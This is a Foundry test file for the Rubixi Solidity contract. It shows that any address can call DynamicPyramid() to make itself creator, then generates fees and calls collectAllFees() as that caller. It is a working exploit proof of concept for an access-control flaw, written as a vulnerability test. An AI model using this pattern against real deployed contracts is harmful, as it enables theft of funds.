
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        // No privileged roles are known/accessible here because `creator` is private
        // and is only set inside `DynamicPyramid()`, which is exactly what we are testing.
        // So we do NOT exclude any specific address as "owner" here.

        // --- 2. State Configuration ---
        // No specific state or funding is required to call DynamicPyramid.

        // --- 3. Execution & Assertion ---
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Trigger the vulnerability: any caller can set themselves as `creator`
        _contractUnderTest.DynamicPyramid();

        // Optional assertion: we now demonstrate that the caller can use a privileged method.
        // Collecting fees will revert if there are no fees, so first create some fees.
        vm.deal(address(this), 2 ether);
        // Send < 1 ether to generate fees without entering the pyramid
        (bool s, ) = address(_contractUnderTest).call{value: 0.5 ether}("");
        require(s, "fee generation failed");

        // Now, as the arbitrary caller (who set themselves as creator), collect all fees
        vm.prank(caller);
        _contractUnderTest.collectAllFees();
    }
}
